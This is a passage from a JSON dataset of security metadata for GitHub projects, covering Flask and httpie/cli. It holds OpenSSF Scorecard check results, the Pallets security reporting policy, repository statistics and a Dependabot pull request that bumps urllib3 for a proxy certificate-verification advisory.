                        "Warn: no topLevel permission defined: .github/workflows/pre-commit.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yaml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-h5c8-rqwp-cp95",
                        "Warn: Project is vulnerable to: GHSA-h75v-3vvj-5mfj",
                        "Warn: Project is vulnerable to: GHSA-2g68-c3qc-8985",
                        "Warn: Project is vulnerable to: GHSA-f9vj-2wh5-fj8j",
                        "Warn: Project is vulnerable to: GHSA-hrfv-mqp8-q5rw / PYSEC-2023-221",
                        "Warn: Project is vulnerable to: GHSA-q34m-jh98-gwm2"
                    ],
                    "score": 4,
                    "reason": "6 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pallets/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nAll Pallets projects share the same security policy. See\nhttps://palletsprojects.com/security, the canonical location for the policy,\nwhich this is copied from.\n\n## Before Reporting\n\nThere are some things we generally do not consider security issues, which can be\nfound at the canonical policy page: https://palletsprojects.com/security. Please\nreview the list before reporting an issue. You may still err on the side of\ncaution and make a private report first, but we may close it or ask you to\nreport a regular issue instead.\n\n## Reporting a Security Issue\n\nIf you believe you have identified a security issue with a Pallets or\nPallets-Eco project, **do not open a public issue**. To responsibly report a\nsecurity issue, use GitHub's [security advisory system][gh-docs]. From the\nproject's repository, click \"Security\" at the top, then click \"Advisories\" at\nthe left, then click the green \"New draft security advisory\" button.\nAlternatively, you may email [security@palletsprojects.com](mailto:security@palletsprojects.com),\nand we will convert that to a GitHub security advisory.\n\nBe sure to include as much detail as necessary in your report. As with reporting\nnormal issues, a minimal reproducible example will help the maintainers address\nthe issue faster. Information about why the issue is a security issue is also\nhelpful. If you are able, you may also provide a fix for the issue.\n\nA maintainer will reply acknowledging the report and how to continue. We will\nobtain a CVE id as well, please do not do this on your own. We will work with\nyou to attempt to understand the issue and decide on its validity. Maintainers\nare volunteers working in their free time, and therefore cannot guarantee any\nspecific timeline. Please be patient during this process.\n\nThe current feature release will receive security fixes. A backport to the\nprevious feature branch may be considered upon request based on usage information\nand severity, but is not guaranteed.\n\n[gh-docs]: https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory\n",
        "project_all_labels": [
            "async",
            "auto-closed",
            "blocker",
            "blueprints",
            "bug",
            "cli",
            "dependencies",
            "discussion",
            "docs",
            "github_actions",
            "good first issue",
            "hacktoberfest-accepted",
            "Invalid",
            "json",
            "logging",
            "packaging",
            "python",
            "question",
            "save-for-sprint",
            "security",
            "session",
            "testing",
            "typing"
        ],
        "README_content": "# Flask\n\nFlask is a lightweight [WSGI][] web application framework. It is designed\nto make getting started quick and easy, with the ability to scale up to\ncomplex applications. It began as a simple wrapper around [Werkzeug][]\nand [Jinja][], and has become one of the most popular Python web\napplication frameworks.\n\nFlask offers suggestions, but doesn't enforce any dependencies or\nproject layout. It is up to the developer to choose the tools and\nlibraries they want to use. There are many extensions provided by the\ncommunity that make adding new functionality easy.\n\n[WSGI]: https://wsgi.readthedocs.io/\n[Werkzeug]: https://werkzeug.palletsprojects.com/\n[Jinja]: https://jinja.palletsprojects.com/\n\n\n## A Simple Example\n\n```python\n# save this as app.py\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    return \"Hello, World!\"\n```\n\n```\n$ flask run\n  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n```\n\n\n## Donate\n\nThe Pallets organization develops and supports Flask and the libraries\nit uses. In order to grow the community of contributors and users, and\nallow the maintainers to devote more time to the projects, [please\ndonate today][].\n\n[please donate today]: https://palletsprojects.com/donate\n",
        "num_commits": 5343,
        "project_age_days": 5320,
        "project_created_at": "2010-04-06",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-24",
        "num_contributors": 401,
        "num_pull": 2593,
        "num_issues": 5240,
        "num_opening_issue": 9,
        "project_size(kB)": 10586,
        "num_stargazers": 67959,
        "num_watchers": 67959,
        "num_forks": 16210,
        "num_subscribers": 2119,
        "SecurityPolicy_created_at": "2019-07-16 21:34:14",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "76200e597624be9a44d07b20734c926d8c5d9665",
                "url": "https://github.com/pallets/.github/commit/76200e597624be9a44d07b20734c926d8c5d9665",
                "date": "2024-09-10 15:42:38"
            },
            {
                "commit_id": "74eacff3189b7efb3bc0aaddc2333b622c19bf84",
                "url": "https://github.com/pallets/.github/commit/74eacff3189b7efb3bc0aaddc2333b622c19bf84",
                "date": "2024-04-22 18:52:39"
            },
            {
                "commit_id": "ad755c68b2f120edaba5dedef1f9299706fb8e10",
                "url": "https://github.com/pallets/.github/commit/ad755c68b2f120edaba5dedef1f9299706fb8e10",
                "date": "2019-07-16 21:34:14"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/pallets/flask/pull/3955",
                "title": "[Security] Bump urllib3 from 1.26.3 to 1.26.4",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 3955,
                "id": 851657963,
                "state": "closed",
                "project_created_at": "2021-04-06T17:46:54Z",
                "closed_at": "2021-04-06T17:49:45Z",
                "body": "Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.26.3 to 1.26.4. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-5phf-pp7p-vc2r\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection</strong></p>\n<h3>Impact</h3>\n<p>Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via <code>proxy_config</code>.\nOnly the default SSLContext is impacted.</p>\n<h3>Patches</h3>\n<p><a href=\"https://github.com/urllib3/urllib3/releases/tag/1.26.4\">urllib3 &gt;=1.26.4 has the issue resolved</a>. urllib3&lt;1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.</p>\n<h3>Workarounds</h3>\n<p>Upgrading is recommended as this is a minor release and not likely to break current usage.</p>\n<p>Configuring an <code>SSLContext</code> with <code>check_hostname=True</code> and passing via <code>proxy_config</code> instead of relying on the default <code>SSLContext</code></p>\n<h3>For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:sethmichaellarson@gmail.com\">sethmichaellarson@gmail.com</a></li>\n</ul>\n<p>Affected versions: &gt;= 1.26.0, &lt;= 1.26.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/releases\">urllib3's releases</a>.</em></p>\n<blockquote>\n<h2>1.26.4</h2>\n<p>:warning: <strong>IMPORTANT: urllib3 v2.0 will drop support for Python 2</strong>: <a href=\"https://urllib3.readthedocs.io/en/latest/v2-roadmap.html\">Read more in the v2.0 Roadmap</a></p>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n<p><strong>If you or your organization rely on urllib3 consider supporting us via <a href=\"https://github.com/sponsors/urllib3\">GitHub Sponsors</a></strong></p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/blob/main/CHANGES.rst\">urllib3's changelog</a>.</em></p>\n<blockquote>\n<h1>1.26.4 (2021-03-15)</h1>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/a8913042b676c510e94fc2b097f6b514ae11a537\"><code>a891304</code></a> Release 1.26.4</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/8d65ea1ecf6e2cdc27d42124e587c1b83a3118b0\"><code>8d65ea1</code></a> Merge pull request from GHSA-5phf-pp7p-vc2r</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/5e3432646ad63749ff0d655c157fe293cdc6c2aa\"><code>5e34326</code></a> Add proper stacklevel to method_allowlist warning</li>\n<li>See full diff in <a href=\"https://github.com/urllib3/urllib3/compare/1.26.3...1.26.4\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/flask/pulls/3955",
                    "merged_at": "2021-04-06T17:49:45Z"
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email_advisory",
        "num_security_issues_after_policy": 1,
        "num_security_issue_and_pull": 1,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/pallets/flask/pull/3955",
                "title": "[Security] Bump urllib3 from 1.26.3 to 1.26.4",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 3955,
                "id": 851657963,
                "state": "closed",
                "project_created_at": "2021-04-06T17:46:54Z",
                "closed_at": "2021-04-06T17:49:45Z",
                "body": "Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.26.3 to 1.26.4. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-5phf-pp7p-vc2r\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection</strong></p>\n<h3>Impact</h3>\n<p>Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via <code>proxy_config</code>.\nOnly the default SSLContext is impacted.</p>\n<h3>Patches</h3>\n<p><a href=\"https://github.com/urllib3/urllib3/releases/tag/1.26.4\">urllib3 &gt;=1.26.4 has the issue resolved</a>. urllib3&lt;1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.</p>\n<h3>Workarounds</h3>\n<p>Upgrading is recommended as this is a minor release and not likely to break current usage.</p>\n<p>Configuring an <code>SSLContext</code> with <code>check_hostname=True</code> and passing via <code>proxy_config</code> instead of relying on the default <code>SSLContext</code></p>\n<h3>For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:sethmichaellarson@gmail.com\">sethmichaellarson@gmail.com</a></li>\n</ul>\n<p>Affected versions: &gt;= 1.26.0, &lt;= 1.26.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/releases\">urllib3's releases</a>.</em></p>\n<blockquote>\n<h2>1.26.4</h2>\n<p>:warning: <strong>IMPORTANT: urllib3 v2.0 will drop support for Python 2</strong>: <a href=\"https://urllib3.readthedocs.io/en/latest/v2-roadmap.html\">Read more in the v2.0 Roadmap</a></p>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n<p><strong>If you or your organization rely on urllib3 consider supporting us via <a href=\"https://github.com/sponsors/urllib3\">GitHub Sponsors</a></strong></p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/blob/main/CHANGES.rst\">urllib3's changelog</a>.</em></p>\n<blockquote>\n<h1>1.26.4 (2021-03-15)</h1>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/a8913042b676c510e94fc2b097f6b514ae11a537\"><code>a891304</code></a> Release 1.26.4</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/8d65ea1ecf6e2cdc27d42124e587c1b83a3118b0\"><code>8d65ea1</code></a> Merge pull request from GHSA-5phf-pp7p-vc2r</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/5e3432646ad63749ff0d655c157fe293cdc6c2aa\"><code>5e34326</code></a> Add proper stacklevel to method_allowlist warning</li>\n<li>See full diff in <a href=\"https://github.com/urllib3/urllib3/compare/1.26.3...1.26.4\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/flask/pulls/3955",
                    "merged_at": "2021-04-06T17:49:45Z"
                }
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "User guideline",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 1,
        "has_generic_policy": true
    },
    {
        "project_name": "httpie/cli",
        "project_url": "https://github.com/httpie/cli",
        "SSF": {
            "date": "2024-10-29T21:50:36+07:00",
            "repo": {
                "name": "github.com/httpie/cli",
                "commit": "50e1564600eaca3ff99ffd7a7f707f564da3af48"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "5 out of 14 merged PRs checked by a CI test -- score normalized to 3",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "Found 9/26 approved changesets -- score normalized to 3",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: httpie contributor org/company found, fal-ai contributor org/company found, 3DprintFIT contributor org/company found, fedora-python contributor org/company found, nodesecurity contributor org/company found, jupyterlab contributor org/company found, python-organizers contributor org/company found, reizio contributor org/company found, fsspec contributor org/company found, adobe contributor org/company found, pyvec contributor org/company found, devassistant contributor org/company found, pytest-dev contributor org/company found, code4rena contributor org/company found, python contributor org/company found, cvut contributor org/company found, admesh contributor org/company found, sclorg contributor org/company found, red hat fit ctu contributor org/company found, hapijs contributor org/company found, conda-forge contributor org/company found, jazzband contributor org/company found, pyldap contributor org/company found, betamaxpy contributor org/company found, LinuxDays contributor org/company found, slic3r contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 26 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "1 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 1",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-style.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/code-style.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-style.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/code-style.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/content.yml:10: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/content.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/content.yml:11: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/content.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/content.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/content.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/coverage.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/coverage.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/coverage.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/coverage.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-check-markdown.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/docs-check-markdown.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docs-check-markdown.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/docs-check-markdown.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-brew.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-brew.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-brew.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-brew.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-choco.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-choco.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:70: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pypi.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pypi.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-pypi.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-pypi.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-snap.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-snap.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-snap.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-snap.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-snap.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-snap.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/stale.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test-package-linux-snap.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/test-package-linux-snap.yml/master?enable=pin",
